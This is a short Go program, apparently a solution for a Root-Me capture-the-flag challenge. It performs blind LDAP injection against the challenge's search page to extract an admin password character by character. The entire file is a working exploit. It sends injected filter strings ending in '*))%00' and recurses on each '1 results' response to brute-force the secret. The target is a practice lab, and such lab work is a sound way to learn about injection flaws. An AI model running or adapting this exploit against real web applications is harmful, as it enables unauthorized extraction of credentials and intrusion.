package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
)

func BlindLDAP(b string, char []rune) {
	var url string
	url = b
	for _, j := range char {
		url = b + string(j) + "*))%00"
		req, _ := http.NewRequest("GET", url, nil)
		res, _ := http.DefaultClient.Do(req)
		defer res.Body.Close()
		body, _ := ioutil.ReadAll(res.Body)
		resp := string(body)
		if strings.Contains(resp, "1 results") {
			fmt.Printf(string(j))
			url = b + string(j)
			BlindLDAP(url, char)
		}
	}
}

func main() {
	var char []rune
	for i := 48; i <= 122; i++ {
		if rune(i) >= '0' && rune(i) <= '9' || rune(i) >= 'a' && rune(i) <= 'z' {
			char = append(char, rune(i))
		}
	}
	var url = "http://challenge01.root-me.org/web-serveur/ch26/?action=dir&search=admin@ch26*)(sn=admin)(password="
	BlindLDAP(url, char)
}
